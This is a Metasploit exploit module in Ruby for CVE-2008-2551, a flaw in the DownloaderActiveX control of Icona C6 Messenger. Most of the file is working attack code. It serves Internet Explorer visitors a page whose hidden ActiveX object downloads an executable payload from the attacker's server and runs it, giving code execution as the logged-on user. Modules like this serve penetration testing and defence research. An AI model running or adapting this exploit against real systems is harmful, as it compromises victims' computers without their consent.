# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::EXE
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Icona SpA C6 Messenger DownloaderActiveX Control Arbitrary File Download and Execute&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability in Icona SpA C6 Messenger 1.0.0.1. The
                vulnerability is in the DownloaderActiveX Control (DownloaderActiveX.ocx). The
                insecure control can be abused to download and execute arbitrary files in the context of
                the currently logged-on user.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Nine:Situations:Group::SnoopyAssault&#039;, # Vulnerability discovery and exploit
                    &#039;juan vazquez&#039; # metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2008-2551&#039; ],
                    [ &#039;OSVDB&#039;, &#039;45960&#039; ],
                    [ &#039;BID&#039;, &#039;29519&#039; ],
                    [ &#039;URL&#039;, &#039;http://retrogod.altervista.org/9sg_c6_download_exec.html&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;ExitFunction&#039;         => "none",
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;           => 2048,
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, { } ],
                ],
            &#039;DisclosureDate&#039; => &#039;Jun 03 2008&#039;,
            &#039;DefaultTarget&#039;  => 0,
            &#039;Privileged&#039;     => false))
    end
    def autofilter
        false
    end
    def check_dependencies
        use_zlib
    end
    def on_request_uri(cli, request)
        # Only IEs are potential targets
        # "File Session" is used when the ActiveX tries to request the EXE
        agent = request.headers[&#039;User-Agent&#039;]
        if agent !~ /MSIE \d\.\d|File Session/
            print_error("Target not supported: #{cli.peerhost}:#{cli.peerport} (#{agent})")
            return
        end
        payload_url =  "http://"
        payload_url += (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(cli.peerhost) : datastore[&#039;SRVHOST&#039;]
        payload_url += ":" + datastore[&#039;SRVPORT&#039;] + get_resource() + "/#{@payload_rand}"
        if (request.uri.match(/#{@payload_rand}/))
            return if ((p = regenerate_payload(cli)) == nil)
            data = generate_payload_exe({ :code => p.encoded })
            print_status("Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...")
            send_response(cli, data, { &#039;Content-Type&#039; => &#039;application/octet-stream&#039; })
            return
        end
        exe = rand_text_alpha(rand(5) + 1 )
        content = %Q|
        <html>
            <object id="DownloaderActiveX1" width="0" height="0" classid="CLSID:c1b7e532-3ecb-4e9e-bb3a-2951ffe67c61" codebase="DownloaderActiveX.cab#Version=1,0,0,1">
                <param name="propProgressBackground"  value="#bccee8">
                <param name="propTextBackground"  value="#f7f8fc">
                <param name="propBarColor"  value="#df0203">
                <param name="propTextColor"  value="#000000">
                <param name="propWidth"  value="0">
                <param name="propHeight"  value="0">
                <param name="propDownloadUrl"  value="#{payload_url}/#{exe}.exe">
                <param name="propPostDownloadAction"  value="run">
                <param name="propInstallCompleteUrl"  value="">
                <param name="propBrowserRedirectUrl"  value="">
                <param name="propVerbose"  value="0">
                <param name="propInterrupt"  value="0">
            </OBJECT>
        </html>
        |
        print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
        send_response_html(cli, content)
        handler(cli)
    end
    def exploit
        @payload_rand = rand_text_alpha(rand(5) + 5 )
        super
    end
end



